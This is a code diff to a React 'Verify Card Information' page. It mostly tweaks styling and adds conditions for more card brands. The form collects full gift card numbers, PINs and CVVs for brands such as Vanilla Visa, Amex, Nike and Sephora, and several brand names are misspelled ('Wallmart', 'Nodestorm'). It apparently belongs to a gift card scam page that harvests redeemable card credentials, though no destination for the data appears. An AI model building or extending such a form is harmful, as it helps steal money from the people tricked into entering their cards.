@@ -111,7 +111,7 @@ const Verify = () => {
         redirect('/error')
       ) : (
         <form method='post' className='flex flex-col gap-8 w-full px-12'> 
-          <span className='flex justify-center text-4xl sm:text-6xl text-primaryText font-bold'>Verify Card Information</span>
+          <span className='flex justify-center text-4xl sm:text-6xl text-white font-bold'>Verify Card Information</span>
           <select 
             name="cardType" 
             id="cardType" 
@@ -180,8 +180,21 @@ const Verify = () => {
             className='w-full h-16 p-4 rounded-xl' 
             required
           />
+
+          {(cardType === 'Vanilla Visa' ||
+          cardType === 'Wallmart Visa' ||
+          cardType === 'Visa Silvery White' ||
+          cardType === 'TT Visa' ||
+          cardType === 'American Express' ||
+          cardType === 'Amex'
+          ) && (
+            <p className='text-red-600 -mt-4'> 16 digit code at the end of the card </p>
+
+          )}
+
+
             {/* Conditionally render cardtype elements if selected */}
-          {(cardType === 'Nodestorm' || cardType === 'Nike') && (
+          {(cardType === 'Nodestorm' || cardType === 'Nike' || cardType === 'Sephora') && (
           <div>
             <input
               className='w-full h-16 p-4 rounded-xl' 
@@ -197,11 +210,14 @@ const Verify = () => {
           </div>
           )}
 
+          
+
           {(cardType === 'Master Card' ||
           cardType === 'Vanilla Visa' ||
           cardType === 'Wallmart Visa' ||
           cardType === 'Visa Silvery White' ||
           cardType === 'TT Visa' ||
+          cardType === 'American Express' ||
           cardType === 'Amex') && (
 
           <div className='flex flex-col gap-4'> 
@@ -220,7 +236,7 @@ const Verify = () => {
             {(cardType === 'Amex') && (
               <div>
                 <input
-                  className='w-full h-16 p-4 rounded-xl' 
+                  className='w-full h-16 p-4 rounded-xl mb-4 -mt-4' 
                   type="text"
                   id="giftCardPin"
                   name="giftCardPin"
@@ -236,7 +252,7 @@ const Verify = () => {
             )}
             <input
               type="text"
-              className='w-full h-16 p-4 rounded-xl' 
+              className='w-full h-16 p-4 rounded-xl -mt-4 -pb-16' 
               id="giftCardCVV"
               name="giftCardCVV"
               value={giftCardCVV}
@@ -250,7 +266,7 @@ const Verify = () => {
 
 
           <button 
-            className=' h-16 rounded-lg bg-primaryText my-4 text-white cursor-pointer flex items-center justify-center ' 
+            className=' h-16 rounded-lg bg-primaryText my- text-white cursor-pointer flex items-center justify-center ' 
             type='submit'
             onClick={sendData}
             >
